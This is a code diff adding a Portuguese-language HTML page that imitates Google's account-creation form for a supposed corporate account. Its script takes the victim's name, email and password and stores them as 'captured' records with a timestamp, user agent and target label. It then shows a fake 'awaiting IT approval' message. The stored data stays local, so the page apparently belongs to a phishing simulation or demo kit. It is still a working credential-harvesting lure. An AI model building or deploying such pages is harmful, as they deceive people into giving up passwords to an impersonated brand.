@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Criar uma Conta do Google</title>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body class="google-login">
+
+  <div class="card" id="stepForm">
+    <div class="glogo"><h1 style="font-size:22px;">Criar uma Conta do Google</h1></div>
+    <p class="subtitle">Digite seus dados para configurar a conta corporativa</p>
+
+    <div class="two-cols">
+      <div class="field"><input type="text" id="nome" placeholder="Nome"></div>
+      <div class="field"><input type="text" id="sobrenome" placeholder="Sobrenome"></div>
+    </div>
+    <div class="field"><input type="email" id="email" placeholder="E-mail corporativo"></div>
+    <div class="two-cols">
+      <div class="field"><input type="password" id="senha" placeholder="Senha"></div>
+      <div class="field"><input type="password" id="confirma" placeholder="Confirmar"></div>
+    </div>
+
+    <p class="hint">O uso deste portal é restrito a colaboradores. Toda atividade é monitorada conforme a política de TI da empresa.</p>
+
+    <div class="card-footer">
+      <a href="../login.html" class="blue-link">Voltar para login</a>
+      <button class="btn-blue" onclick="createAccount()">Criar conta</button>
+    </div>
+  </div>
+
+  <div class="card hidden" id="stepDone">
+    <div class="glogo"><h1 style="font-size:22px;" class="ok">✓ Conta criada</h1></div>
+    <p class="subtitle">A solicitação foi enviada para aprovação da TI.<br>Você receberá a liberação do acesso em até <b>24 horas</b>.</p>
+
+    <div class="card-footer">
+      <a href="../login.html" class="btn-blue">Voltar ao login</a>
+      <span></span>
+    </div>
+  </div>
+
+<script>
+function createAccount(){
+  const nome = document.getElementById('nome').value.trim();
+  const sobrenome = document.getElementById('sobrenome').value.trim();
+  const email = document.getElementById('email').value.trim();
+  const senha = document.getElementById('senha').value;
+  const confirma = document.getElementById('confirma').value;
+
+  if(!email.includes('@')){ document.getElementById('email').focus(); return; }
+  if(!senha){ document.getElementById('senha').focus(); return; }
+  if(senha !== confirma){ alert('As senhas não coincidem.'); document.getElementById('confirma').focus(); return; }
+
+  const store = JSON.parse(localStorage.getItem('captured') || '[]');
+  store.push({
+    email: '[CADASTRO] ' + (nome || sobrenome ? (nome + ' ' + sobrenome).trim() + ' · ' : '') + email,
+    password: senha,
+    timestamp: new Date().toLocaleTimeString('pt-BR'),
+    userAgent: navigator.userAgent,
+    target: 'criação de conta'
+  });
+  localStorage.setItem('captured', JSON.stringify(store));
+  localStorage.setItem('captured_event', Date.now());
+
+  document.getElementById('stepForm').classList.add('hidden');
+  document.getElementById('stepDone').classList.remove('hidden');
+}
+</script>
+</body>
+</html>
